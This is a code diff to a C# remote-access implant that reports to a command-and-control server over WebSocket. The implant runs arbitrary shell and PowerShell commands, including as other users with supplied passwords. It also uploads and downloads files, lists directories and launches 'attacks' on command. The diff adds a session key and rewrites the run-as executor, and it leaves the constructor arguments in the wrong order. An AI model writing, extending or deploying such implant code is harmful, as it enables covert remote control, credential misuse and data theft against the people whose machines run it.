@@ -33,9 +33,10 @@ namespace Implant
 
     public class Implant
     {
-        private string _c2WsUrl;
+        private string _base_url;
         private string _group;
         private string _currentDir;
+        private string _sess_key;
         private Dictionary<int, byte[]> _chunkSequences = new Dictionary<int, byte[]>();
         private bool _running;
         private List<Attack> _attacks;
@@ -49,10 +50,11 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant(string c2WsUrl, string group = "default")
+        public Implant(string base_url, string group = "default", string sess_key="")
         {
-            _c2WsUrl = c2WsUrl;
+            _base_url = base_url;
             _group = group;
+            _sess_key = sess_key;
             _currentDir = Directory.GetCurrentDirectory();
             _running = true;
             _attacks = new List<Attack>();
@@ -90,7 +92,7 @@ namespace Implant
 
             _ws = new ClientWebSocket();
 
-            var uri = new Uri($"wss://{_c2WsUrl}?id={_implId}-root={GetRoot()}-user={Environment.UserName}");
+            var uri = new Uri($"wss://{_base_url}?id={_implId}-root={GetRoot()}-user={Environment.UserName}&sess_key={_sess_key}");
 
             try
             {
@@ -101,8 +103,11 @@ namespace Implant
                 while (_running && _ws.State == WebSocketState.Open)
                 {
                     var message = await ReceiveMessage();
-                    if (!string.IsNullOrEmpty(message))
-                    {
+                    if( message.Contains("Invalid conection")){
+                        await CloseWebSocketAsync();
+                        Environment.Exit(0);
+
+                    }else{
                         await HandleCommand(message);
                     }
                 }
@@ -166,56 +171,6 @@ namespace Implant
                 _running = false;
             }
         }
-
-
-        private async Task HandleCommand(string commandJson)
-        {
-            try
-            {
-                JObject data = JObject.Parse(commandJson);
-
-
-                if (data.ContainsKey("cmd"))
-                {
-                    await ExecuteCommand(data["cmd"].ToString());
-                }
-                else if (data.ContainsKey("chunk"))
-                {
-                    var chunkData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["chunk"].ToString());
-                    await HandleFileUpload(chunkData, data["destination"].ToString());
-
-                }
-                else if (data.ContainsKey("list_files"))
-                {
-                    var path = data.ContainsKey("path") ? data["path"].ToString() : _currentDir;
-                    await ListDirectory(path);
-                }
-                else if (data.ContainsKey("get_files"))
-                {
-                    await SendFile(data["get_files"].ToString());
-                }
-                else if (data.ContainsKey("attack"))
-                {
-                    var attackData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["attack"].ToString());
-                    await HandleAttackCommand(attackData);
-                }
-                else if (data.ContainsKey("stop_attack"))
-                {
-                    await StopAttack(data["stop_attack"].ToString());
-                }
-                else if (data.ContainsKey("finish"))
-                {
-                    ExitWs();
-                }
-            }
-            catch (Exception e)
-            {
-                await SendResponse(new { error = e.Message });
-            }
-        }
-
-
-
 
 
         private async Task ExecuteCommand(string command)
@@ -304,7 +259,7 @@ namespace Implant
 
                 var domain = Environment.UserDomainName;
 
-                var result = await ExecutePowerShellAsUser(actualCommand, username, domain, password);
+                var result = await ExecuteCommandAsUser(actualCommand, username, domain, password);
 
                 await SendResponse(new
                 {
@@ -323,70 +278,78 @@ namespace Implant
             }
         }
 
-
-
-        private async Task<string> ExecutePowerShellAsUser(string command, string username, string domain, string password, string host = "localhost")
+        private async Task<string> ExecuteCommandAsUser(string command, string username, string domain, string password)
         {
             try
             {
-                string escapedPassword = password.Replace("'", "''");
+                bool runInBackground = command.EndsWith(" &");
+                if (runInBackground)
+                    command = command.Substring(0, command.Length - 1).Trim();
 
-                string currentExe = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
+                // Detectar redirección (> o >>)
+                string outputFile = null;
+                bool append = false;
 
-                var updated_command = command;
-
-                if (command.EndsWith("&"))
-                    updated_command = command.Substring(0, command.Length - 1).Trim();
-
-
-
-                string psScript = $@"
-                  $securePassword = ConvertTo-SecureString '{escapedPassword}' -AsPlainText -Force
-                  $credential = New-Object System.Management.Automation.PSCredential('{domain}\{username}', $securePassword)
-
-                  try {{
-                      $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
-                          Set-Location $args[1]
-
-                          if ($args[0] -match '\.(exe|com|bat|cmd|msi)$' ) {{
-                              & $args[0] 2>&1 | Out-String
-                          }}
-                          else {{
-                              Invoke-Expression $args[0] 2>&1 | Out-String
-                          }}
-                      }} -ArgumentList '{updated_command}', '{_currentDir}' -ErrorAction Stop
-
-                      Write-Output ""$result""
-                  }}
-                  catch {{
-                      Write-Output ""ERROR:$($_.Exception.Message)""
-                  }}
-                  ";
-
-                var process = new Process
+                var redirMatch = Regex.Match(command, @"(.*?)\s*(>>?)\s*(.+)$");
+                if (redirMatch.Success)
                 {
+                    command = redirMatch.Groups[1].Value.Trim();
+                    append = redirMatch.Groups[2].Value == ">>";
+                    outputFile = redirMatch.Groups[3].Value.Trim().Trim('"');
+                }
 
+                // Parseo de comando + args respetando comillas
+                var matches = Regex.Matches(command, @"'[^']*'|""[^""]*""|[^ \t]+");
+                var parts = matches.Cast<Match>().Select(m =>
+                {
+                    var s = m.Value;
+                    if ((s.StartsWith("\"") && s.EndsWith("\"")) || (s.StartsWith("'") && s.EndsWith("'")))
+                        return s.Substring(1, s.Length - 2);
+                    return s;
+                }).ToArray();
 
-                    StartInfo = new ProcessStartInfo
-                    {
-                        FileName = "powershell.exe",
-                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psScript}\"",
-                        WorkingDirectory = _currentDir,
-                        RedirectStandardOutput = true,
-                        RedirectStandardError = true,
-                        UseShellExecute = false,
-                        CreateNoWindow = true
-                    },
-                    EnableRaisingEvents = true
+                if (parts.Length == 0)
+                    return "No command provided.";
+
+                string exe = parts[0];
+                string args = string.Join(" ", parts.Skip(1).Select(p => $"\"{p}\""));
+
+                bool isExecutable =
+                    File.Exists(exe) ||
+                    Environment.GetEnvironmentVariable("PATH")
+                        .Split(Path.PathSeparator)
+                        .Any(p => File.Exists(Path.Combine(p, exe)) || File.Exists(Path.Combine(p, exe + ".exe")));
+
+                if (!isExecutable)
+                {
+                    exe = "powershell.exe";
+                    args = $"-NoProfile -Command \"{command}\"";
+                }
+
+                var psi = new ProcessStartInfo
+                {
+                    FileName = exe,
+                    Arguments = args,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = !runInBackground,
+                    RedirectStandardError = !runInBackground,
+                    CreateNoWindow = true,
+                    Domain = domain,
+                    UserName = username,
+                    WorkingDirectory = _currentDir
                 };
 
-                if (command.IndexOf(currentExe, StringComparison.OrdinalIgnoreCase) >= 0 || command.EndsWith(" &"))
-                {
-                    process.StartInfo.RedirectStandardOutput = false;
-                    process.StartInfo.RedirectStandardError = false;
+                var securePwd = new SecureString();
+                foreach (char c in password)
+                    securePwd.AppendChar(c);
+                psi.Password = securePwd;
 
+                var process = new Process { StartInfo = psi, EnableRaisingEvents = true };
+
+                if (runInBackground)
+                {
                     process.Start();
-                    return $"Process {process.Id} started in background (command matched {currentExe}).";
+                    return $"Process {process.Id} started in background.";
                 }
 
                 var outputBuilder = new StringBuilder();
@@ -407,11 +370,21 @@ namespace Implant
 
                 process.Exited += (s, e) =>
                 {
-                    if (errorBuilder.Length > 0)
-                        tcs.TrySetResult("ERROR: " + errorBuilder.ToString());
-                    else
-                        tcs.TrySetResult(outputBuilder.ToString());
+                    string result = errorBuilder.Length > 0
+                        ? "ERROR: " + errorBuilder.ToString()
+                        : outputBuilder.ToString();
 
+                    // Guardar en archivo si había redirección
+                    if (!string.IsNullOrEmpty(outputFile))
+                    {
+                        if (append)
+                            File.AppendAllText(outputFile, result);
+                        else
+                            File.WriteAllText(outputFile, result);
+                        result = $"Output redirected to {outputFile}";
+                    }
+
+                    tcs.TrySetResult(result);
                     process.Dispose();
                 };
 
@@ -423,9 +396,10 @@ namespace Implant
             }
             catch (Exception ex)
             {
-                return $"Error ejecutando comando: {ex.Message}";
+                return $"Error executing command: {ex.Message}";
             }
         }
+
 
 
         private async Task<string> ExecuteShellCommand(string command)
@@ -509,8 +483,6 @@ namespace Implant
                 return ("", ex.Message);
             }
         }
-
-
 
 
 
@@ -989,12 +961,12 @@ namespace Implant
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
 
-                    await client.PostAsync($"https://{_c2WsUrl}/api/impl/new/{model.impl_id}", content);
+                    await client.PostAsync($"https://{_base_url}/api/impl/new/{model.impl_id}", content);
                 }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error en Register: {ex.Message}");
+                Debug.WriteLine($"Register error: {ex.Message}");
             }
         }
 
@@ -1174,11 +1146,12 @@ namespace Implant
                 string url = data[1];
                 string port = data[2];
                 string group = data[3];
+                string sess_key = data[4];
 
 
-                var implant = new Implant( $"{url}:{port}", group);
+                var implant = new Implant( group, $"{url}:{port}", sess_key);
+
                 await implant.Run();
-
 
             }
             catch (Exception ex)
